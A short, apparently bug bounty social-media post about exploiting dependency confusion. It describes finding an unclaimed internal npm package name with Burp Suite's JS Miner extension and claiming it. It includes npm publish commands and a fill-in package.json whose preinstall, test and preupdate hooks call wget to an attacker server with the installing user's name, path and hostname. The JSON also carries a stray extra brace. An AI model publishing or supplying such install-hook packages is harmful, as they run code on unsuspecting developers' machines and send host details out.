⚡Dependency Confusion via JS Miner

@GodfatherOrwa just landed a clean P1 by leveraging JS Miner in Burp Suite 🔥

Here’s how it went down 👇

🧩 After crawling all endpoints, he went to:
Target ➝ Extensions ➝ JS Miner ➝ Run All Passive Scans

💥 That’s when he spotted: [JS Miner] Dependency Confusion
The vulnerable package was unclaimed on NPM 👀

📦 Next steps he followed:

```
    npm login
    mkdir <package-name> && cd <package-name>
    npm init -y
    npm publish --access public

```

package.json

```
{
  "name": "====>Replace This wite The Package NAME",
  "version": "10.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "wget --quiet \"http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" ",
    "preinstall": "wget --quiet \"http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" ",
    "preupdate": "wget --quiet \"http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" "
  },
  "author": "orwa",
  "license": "ISC"
  }
}
```

After claiming the package, he injected an RCE payload via package.json
🧪 Full POC: [https://github.com/orwagodfather/NPM-RCE](https://github.com/orwagodfather/NPM-RCE)

💣 Result? A solid P1 vulnerability and a perfect example of how effective Dependency Confusion still is.

Props to @GodfatherOrwa for consistently dropping fire techniques 🔥
